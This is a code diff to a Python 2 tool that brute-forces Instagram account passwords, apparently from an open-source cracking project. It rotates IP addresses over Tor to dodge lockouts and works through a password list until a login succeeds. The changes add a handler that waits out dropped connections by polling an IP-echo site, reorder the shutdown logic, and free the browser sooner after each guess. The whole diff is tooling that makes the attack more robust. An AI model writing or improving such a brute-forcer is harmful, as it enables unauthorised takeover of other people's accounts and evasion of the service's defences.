@@ -7,6 +7,7 @@
 
 import os
 import time
+import urllib
 import argparse
 import threading
 import subprocess
@@ -22,6 +23,7 @@ class Instagram(TorManager,Browser):
 
   self.ip = None # current ip address
   self.tries = 0
+  self.wait = False # wait for connection
   self.alive = True # is bruter still running
   self.isFound = False # is the password found?
 
@@ -43,6 +45,8 @@ class Instagram(TorManager,Browser):
   self.b = '\033[34m' # blue
 
  def kill(self,msg=None):
+  self.alive = False
+  self.stopTor()
   try:
    if self.isFound:
     self.display(msg)
@@ -54,9 +58,6 @@ class Instagram(TorManager,Browser):
 
    if all([not self.isFound, msg]):
     print '\n  [-] {}'.format(msg)
-
-   self.alive = False
-   self.stopTor()
   finally:exit()
 
  def modifylist(self):
@@ -78,7 +79,7 @@ class Instagram(TorManager,Browser):
     self.updateIp()
     self.manageIps(rec-1)
    else:
-    self.kill('Lost Connection'.format(self.y,self.r,self.n))
+    self.connectionHandler()
 
  def changeIp(self):
   self.createBrowser()
@@ -104,18 +105,32 @@ class Instagram(TorManager,Browser):
    if not len(self.passlist):
     self.alive = False
 
+ def connectionHandler(self):
+  if self.wait:return
+  self.wait = True
+  print '  [-] Waiting For Connection {}...{}'.format(self.g,self.n)
+  while all([self.alive,self.wait]):
+   try:
+    self.updateIp()
+    urllib.urlopen('https://wtfismyip.com/text')
+    self.wait = False
+    break
+   except IOError:
+    time.sleep(1.5)
+  self.manageIps()
+
  def attempt(self,pwd):
   with self.lock:
    self.tries+=1
    self.createBrowser()
    html = self.login(pwd)
+   self.deleteBrowser()
 
    if html:
     if all([not self.form1 in html,not self.form2 in html]):
      self.isFound = True
      self.kill(pwd)
     del self.passlist[self.passlist.index(pwd)]
-   self.deleteBrowser()
 
  def run(self):
   self.display()
